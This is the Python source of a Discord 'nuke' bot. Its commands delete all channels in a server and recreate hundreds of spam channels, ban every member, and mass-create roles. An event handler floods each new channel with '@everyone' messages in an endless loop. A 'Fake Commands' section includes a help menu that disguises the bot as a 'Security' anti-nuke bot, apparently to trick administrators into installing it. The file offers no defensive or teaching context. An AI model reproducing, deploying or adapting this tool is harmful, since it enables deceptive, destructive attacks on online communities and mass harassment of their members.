import discord
from discord.ext.commands import *
from discord.ext import commands
import random
import asyncio
import time
import json
from itertools import cycle
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get

###########################################################################################
#                                        Inputs                                           #
###########################################################################################

R_Names = ["upytry nuked","upytry shot u"," nuked"]
C_Names = ["dog water","free","imagine"]
M_Names = ["ran by upytry @everyone"]


#########################################################
#                                         Important                                      #
###########################################################################################

 
token = ""
 
client = commands.Bot(command_prefix='$')

client.remove_command('help')



###########################################################################################
#                                         Nuke Commands                                   #
###########################################################################################

@client.command()
async def nuke(ctx, amount=1000):
   channels = ctx.guild.channels
   for channel in channels:
      try:
          await channel.delete()
          print(channel.name + " has been deleted.")
      except Exception as error:
         print(channel.name + " Cant be deleted")
         print(error)
   guild = ctx.message.guild
   for i in range(amount):
         await guild.create_text_channel(random.choice(C_Names))

@client.command()
async def clear(ctx):
   channels = ctx.guild.channels
   for channel in channels:
      try:
          await channel.delete()
          print(channel.name + " has been deleted.")
      except Exception as error:
         print(channel.name + " Cant be deleted")
         print(error)
   guild = ctx.message.guild
   await guild.create_text_channel("general")
   quit()

@client.command(pass_context=True)
async def Banall(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} has been banned")
            except:
                await ctx.guild.ban(user)
                print (f"{user.name} didnt get banned from  {ctx.guild.name} :(")
  
#Lets make a spam role thing
@client.command()
async def roles(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"PrabhS beamed")
      print("Made Role")
    except:
        print("Failed to make role")



###########################################################################################
#                                       Fake Commands                                     #
###########################################################################################

@client.command()
async def help_nukes(ctx):
  embed = discord.Embed(title = "upytry nukebot"  , description = "upytry nuker" , color = discord.Colour.purple())

  embed.set_author(name = "upytry")
  embed.add_field(name = "Nuke" , value = "Deletes All Channels and Makes a Bunch Of Channels While Spamming" , inline = False)
  embed.add_field(name = "Banall", value = "Bans Everyone In The Server", inline = False)
  embed.add_field(name = "Roles" , value = "Spams Alot Of Roles", inline = False)

  await ctx.send(embed=embed)

@client.command()
async def help(ctx):
  await ctx.message.delete()
  embed = discord.Embed(title="Security", description="Security Bot Commands", color=discord.Colour.red())

  embed.set_author(name="Security Destroyer")
  embed.add_field(name="Setup", value="Initializes Anti Nuke Feature", inline=False)
  embed.add_field(name = "Ban", value = "Bans Specified User" , inline = False)
  embed.add_field(name = "Kick" , value = "Kicks Specified User" , inline = False)
  embed.add_field(name = "Purge" , value = "Deletes The Specified Number Of Messages", inline = False)
  embed.add_field(name = "Mute", value = "Mutes Specified User For Specified Time")
  await ctx.send(embed=embed)

@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "PrabhS is too cool"))
  print("Logged in as" + format(client.user.name))



@client.event
async def on_guild_channel_create(channel):
    while True:
      await channel.send(random.choice(M_Names))
    


client.run(token) 
